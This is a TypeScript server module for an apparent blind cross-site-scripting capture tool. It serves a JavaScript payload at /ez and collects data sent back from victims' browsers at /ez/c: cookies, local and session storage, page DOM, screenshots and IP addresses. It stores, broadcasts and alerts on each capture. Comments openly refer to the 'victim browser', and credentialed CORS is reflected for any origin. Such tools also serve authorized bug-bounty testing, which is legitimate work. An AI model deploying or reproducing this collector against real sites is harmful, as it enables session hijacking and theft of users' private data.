import { Hono } from "hono";
import { bodyLimit } from "hono/body-limit";
import { readFile } from "fs/promises";
import { join } from "path";
import { prisma as sharedPrisma } from "../lib/prisma.ts";
import { minioClient, MINIO_BUCKET } from "../lib/minio.ts";
import { broadcast } from "../lib/broadcast.ts";
import { sendNotification } from "../lib/notify.ts";
import { rateLimiter } from "hono-rate-limiter";

const TEMPLATES_DIR = join(process.cwd(), "src", "templates");

// M-12: lazy in-memory cache — files are static, no need to read from disk on every request
let _ezTemplate: string | null = null;
let _html2canvas: string | null = null;

async function getEzTemplate(): Promise<string> {
  if (!_ezTemplate) _ezTemplate = await readFile(join(TEMPLATES_DIR, "ez-payload.js"), "utf-8");
  return _ezTemplate;
}

async function getHtml2canvas(): Promise<string> {
  if (_html2canvas === null) {
    try { _html2canvas = await readFile(join(TEMPLATES_DIR, "html2canvas.min.js"), "utf-8"); }
    catch { console.warn("[EZ] html2canvas.min.js not found — screenshots disabled"); _html2canvas = ""; }
  }
  return _html2canvas;
}

// ── C-02: Rate limiter + body size limit for /ez/c ────────────────────────────
const ezCallbackLimiter = rateLimiter({
  windowMs: 60 * 1000,
  limit: 100,
  standardHeaders: "draft-6",
  keyGenerator: (c) =>
    c.req.header("x-forwarded-for")?.split(",")[0].trim() ||
    c.req.header("x-real-ip") ||
    "unknown",
});

const EZ_MAX_BODY = 10 * 1024 * 1024; // 10 MB

// ── CORS helper ───────────────────────────────────────────────────────────────
function setCors(c: any) {
  const origin = c.req.header("origin");
  c.header("Access-Control-Allow-Origin", origin ?? "*");
  if (origin) c.header("Access-Control-Allow-Credentials", "true");
}

// ── Victim-facing capture router — mounted at /ez ────────────────────────────
export const ezCaptureRouter = new Hono();

// OPTIONS /ez — preflight for payload request
ezCaptureRouter.options("/", (c) => {
  setCors(c);
  c.header("Access-Control-Allow-Methods", "GET, OPTIONS");
  c.header("Access-Control-Allow-Headers", "*");
  c.header("Access-Control-Max-Age", "86400");
  return c.body(null, 204);
});

// OPTIONS /ez/c — preflight for callback
ezCaptureRouter.options("/c", (c) => {
  setCors(c);
  c.header("Access-Control-Allow-Methods", "POST, OPTIONS");
  c.header("Access-Control-Allow-Headers", "*");
  c.header("Access-Control-Max-Age", "86400");
  return c.body(null, 204);
});

// GET /ez — serve the dynamically built JS payload
ezCaptureRouter.get("/", async (c) => {
  try {
    const settings = await sharedPrisma.settings.findFirst();

    // Build noCollect array from disabled toggles
    const noCollect: string[] = [];
    if (settings?.ezCollectCookies === false) noCollect.push("cookies");
    if (settings?.ezCollectDom === false) noCollect.push("dom");
    if (settings?.ezCollectLocalStorage === false) noCollect.push("localstorage");
    if (settings?.ezCollectSessionStorage === false) noCollect.push("sessionstorage");
    if (settings?.ezCollectScreenshot === false) noCollect.push("screenshot");

    // Read payload template (cached in memory after first load)
    let js = await getEzTemplate();

    // Determine protocol and domain from the incoming request
    // H-01: Validate Host header before injecting into JS payload to prevent code injection
    const rawHost = c.req.header("host") ?? "localhost:3000";
    const host = /^[a-zA-Z0-9.\-]+(:\d+)?$/.test(rawHost) ? rawHost : "localhost:3000";
    const proto = c.req.header("x-forwarded-proto") === "https" || c.req.raw.url.startsWith("https://")
      ? "https"
      : "http";

    // Substitute placeholders
    js = js.replace(/\{\{protocol\}\}/g, proto);
    js = js.replace(/\{\{domain\}\}/g, host);
    js = js.replace(/\{%data payload\}/g, host);
    js = js.replace(/\{%data noCollect\}/g, noCollect.map(f => `"${f}"`).join(","));

    // Inline html2canvas if screenshot collection is enabled (cached in memory after first load)
    const screenshotJs = settings?.ezCollectScreenshot !== false ? await getHtml2canvas() : "";
    js = js.replace(/\{%data screenshot\}/g, screenshotJs);

    const origin = c.req.header("origin");
    return new Response(js, {
      status: 200,
      headers: {
        "Content-Type": "application/javascript; charset=utf-8",
        "Cache-Control": "no-store, no-cache",
        "X-Content-Type-Options": "nosniff",
        "Access-Control-Allow-Origin": origin ?? "*",
        ...(origin && { "Access-Control-Allow-Credentials": "true" }),
      },
    });
  } catch (error) {
    console.error("[EZ] Failed to serve payload:", error);
    const origin = c.req.header("origin");
    return new Response("// payload unavailable", {
      status: 500,
      headers: { "Content-Type": "application/javascript; charset=utf-8", "Access-Control-Allow-Origin": origin ?? "*" },
    });
  }
});

// POST /ez/c — receive JS callback data
ezCaptureRouter.post(
  "/c",
  ezCallbackLimiter,
  bodyLimit({
    maxSize: EZ_MAX_BODY,
    onError: (c) => {
      setCors(c);
      return c.text("ok", 413);
    },
  }),
  async (c) => {
  try {
    const ip =
      c.req.header("x-forwarded-for")?.split(",")[0].trim() ||
      c.req.header("x-real-ip") ||
      "unknown";

    let body: Record<string, any> = {};
    try {
      const raw = await c.req.text();
      body = JSON.parse(raw);
    } catch {
      setCors(c);
      return c.text("ok");
    }

    // Screenshot: decode base64 PNG and upload to MinIO
    let screenshotPath: string | null = null;
    const screenshotData: string | undefined = body.screenshot;
    if (screenshotData && screenshotData.startsWith("data:image/png;base64,")) {
      try {
        const base64 = screenshotData.replace("data:image/png;base64,", "");
        const buffer = Buffer.from(base64, "base64");
        const filename = `ez/screenshots/${Date.now()}-${Math.random().toString(36).slice(2)}.png`;
        await minioClient.putObject(MINIO_BUCKET, filename, buffer, buffer.length, {
          "Content-Type": "image/png",
        });
        screenshotPath = filename;
      } catch (e) {
        console.error("[EZ] Screenshot upload failed:", e);
      }
    }

    // Persist to DB
    const capture = await sharedPrisma.ezCapture.create({
      data: {
        uri: body.uri || null,
        origin: body.origin || null,
        referer: body.referer || null,
        userAgent: body["user-agent"] || null,
        cookies: body.cookies || body._cookieSnapshot || null,
        localStorage: body.localstorage || null,
        sessionStorage: body.sessionstorage || null,
        dom: body.dom || null,
        screenshotPath,
        extra: body.extra ? JSON.stringify(body.extra) : null,
        ipAddress: ip,
      },
    });

    // Broadcast to dashboard (without heavy fields)
    broadcast({
      type: "ez",
      data: {
        id: capture.id,
        uri: capture.uri,
        origin: capture.origin,
        referer: capture.referer,
        userAgent: capture.userAgent,
        cookies: capture.cookies,
        hasLocalStorage: !!(capture.localStorage && capture.localStorage !== '{}' && capture.localStorage !== '""'),
        hasSessionStorage: !!(capture.sessionStorage && capture.sessionStorage !== '{}' && capture.sessionStorage !== '""'),
        hasDom: !!capture.dom,
        hasScreenshot: !!capture.screenshotPath,
        ipAddress: capture.ipAddress,
        createdAt: capture.createdAt.toISOString(),
      },
    });

    // Fire-and-forget notification
    void sendNotification({
      type: "ez",
      ipAddress: ip,
      ezUri: capture.uri,
      ezOrigin: capture.origin,
      ezCookies: capture.cookies,
      ezScreenshotPath: screenshotPath,
    });

    setCors(c);
    return c.text("ok");
  } catch (error) {
    console.error("[EZ] Callback error:", error);
    setCors(c);
    return c.text("ok"); // Always 200 to avoid leaking errors to victim browser
  }
});

// ── API router — mounted at /api/ez ──────────────────────────────────────────
export const ezApiRouter = new Hono();

// GET /api/ez — paginated list (no dom/localStorage/sessionStorage in list)
ezApiRouter.get("/", async (c) => {
  const page = Math.max(1, parseInt(c.req.query("page") || "1"));
  const limit = Math.min(parseInt(c.req.query("limit") || "50"), 200);
  const skip = (page - 1) * limit;

  const [captures, total] = await Promise.all([
    sharedPrisma.ezCapture.findMany({
      skip,
      take: limit,
      orderBy: { createdAt: "desc" },
      select: {
        id: true,
        uri: true,
        origin: true,
        referer: true,
        userAgent: true,
        cookies: true,
        ipAddress: true,
        screenshotPath: true,
        extra: true,
        programId: true,
        createdAt: true,
        // Intentionally excluded: dom, localStorage, sessionStorage (too large for list)
      },
    }),
    sharedPrisma.ezCapture.count(),
  ]);

  const data = captures.map((cap) => ({
    ...cap,
    hasScreenshot: !!cap.screenshotPath,
    screenshotPath: undefined, // don't expose internal MinIO path
    createdAt: cap.createdAt.toISOString(),
  }));

  return c.json({ data, pagination: { total, page, limit } });
});

// GET /api/ez/:id — full detail including dom
ezApiRouter.get("/:id", async (c) => {
  const id = parseInt(c.req.param("id"));
  if (isNaN(id)) return c.json({ error: "Invalid ID" }, 400);

  const capture = await sharedPrisma.ezCapture.findUnique({ where: { id } });
  if (!capture) return c.json({ error: "Not found" }, 404);

  return c.json({
    ...capture,
    hasScreenshot: !!capture.screenshotPath,
    screenshotPath: undefined,
    createdAt: capture.createdAt.toISOString(),
  });
});

// GET /api/ez/:id/screenshot — stream PNG from MinIO
ezApiRouter.get("/:id/screenshot", async (c) => {
  const id = parseInt(c.req.param("id"));
  if (isNaN(id)) return c.json({ error: "Invalid ID" }, 400);

  const capture = await sharedPrisma.ezCapture.findUnique({
    where: { id },
    select: { screenshotPath: true },
  });
  if (!capture?.screenshotPath) return c.json({ error: "No screenshot" }, 404);

  try {
    const stream = await minioClient.getObject(MINIO_BUCKET, capture.screenshotPath);
    const chunks: Buffer[] = [];
    for await (const chunk of stream) chunks.push(Buffer.from(chunk));
    const buffer = Buffer.concat(chunks);

    c.header("Content-Type", "image/png");
    c.header("Cache-Control", "private, max-age=3600");
    return c.body(buffer);
  } catch {
    return c.json({ error: "Screenshot not found" }, 404);
  }
});

// DELETE /api/ez — clear all captures
// H-09: Registered before DELETE /:id to prevent route shadowing
ezApiRouter.delete("/", async (c) => {
  const captures = await sharedPrisma.ezCapture.findMany({
    select: { screenshotPath: true },
  });

  for (const cap of captures) {
    if (cap.screenshotPath) {
      try {
        await minioClient.removeObject(MINIO_BUCKET, cap.screenshotPath);
      } catch {}
    }
  }

  await sharedPrisma.ezCapture.deleteMany();
  return c.json({ message: "All captures deleted" });
});

// DELETE /api/ez/:id — delete capture + screenshot
ezApiRouter.delete("/:id", async (c) => {
  const id = parseInt(c.req.param("id"));
  if (isNaN(id)) return c.json({ error: "Invalid ID" }, 400);

  const capture = await sharedPrisma.ezCapture.findUnique({
    where: { id },
    select: { screenshotPath: true },
  });
  if (!capture) return c.json({ error: "Not found" }, 404);

  if (capture.screenshotPath) {
    try {
      await minioClient.removeObject(MINIO_BUCKET, capture.screenshotPath);
    } catch (e) {
      console.warn("[EZ] Failed to delete screenshot from MinIO:", e);
    }
  }

  await sharedPrisma.ezCapture.delete({ where: { id } });
  return c.json({ message: "Deleted" });
});
